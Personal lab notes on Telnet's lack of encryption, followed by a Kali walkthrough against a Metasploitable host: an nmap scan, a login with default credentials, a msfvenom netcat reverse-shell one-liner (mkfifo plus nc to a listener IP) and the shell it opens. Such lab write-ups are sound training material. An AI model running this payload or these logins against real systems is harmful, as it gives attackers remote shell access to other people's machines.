https://www.techtarget.com/searchnetworking/definition/Telnet


Users connect remotely to a machine using Telnet, sometimes referred to as Telnetting into the system. 

Telnet is not a secure protocol and is unencrypted. 

By monitoring a user's connection, anyone can access a person's username, password and other private information that is typed over the Telnet session in plaintext. With this information, access can be gained to the user's device.


Never use Telnet - https://www.youtube.com/watch?v=nGEKnYUEPcg

All the communication can be seen, using wireshark in telnet

Telnet is deprecated. one shoud use SSH or RDP


we can connect to a maahine like

>> telnet 10.129.108.108


NOTE - 

- "root" username is able to log into the target over telnet with a blank password

****************************************************************************************************************************************************
# Exploiting Telnet

┌──(kali㉿kali)-[~]
└─$ `nmap 192.168.204.132 -p 23 `                  
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-16 07:03 EST
Nmap scan report for 192.168.204.132
Host is up (0.0013s latency).

PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ `telnet 192.168.204.132 `                      
Trying 192.168.204.132...
Connected to 192.168.204.132.
metasploitable login: msfadmin
Password: 
msfadmin@metasploitable:~$ `uname -a`
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

# Generating a msfvenom reverse_shell Raw Payload and starting a netcat listner 

┌──(kali㉿kali)-[~]
└─$ `msfvenom -p cmd/unix/reverse_netcat lhost=192.168.204.130 lport=4444 R`
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 93 bytes
mkfifo /tmp/jlre; nc 192.168.204.130 4444 0</tmp/jlre | /bin/sh >/tmp/jlre 2>&1; rm /tmp/jlre

┌──(kali㉿kali)-[~]
└─$ `nc -nlvp 4444`
listening on [any] 4444 ...

# Copying the RAW payload in telnet session

msfadmin@metasploitable:~$ `mkfifo /tmp/jlre; nc 192.168.204.130 4444 0</tmp/jlre | /bin/sh >/tmp/jlre 2>&1; rm /tmp/jlre`

# We get the reverse shell

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.204.130] from (UNKNOWN) [192.168.204.132] 51066
`uname `
Linux
`/bin/bash -i`
bash: no job control in this shell
msfadmin@metasploitable:~$ `id`
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
msfadmin@metasploitable:~$ 


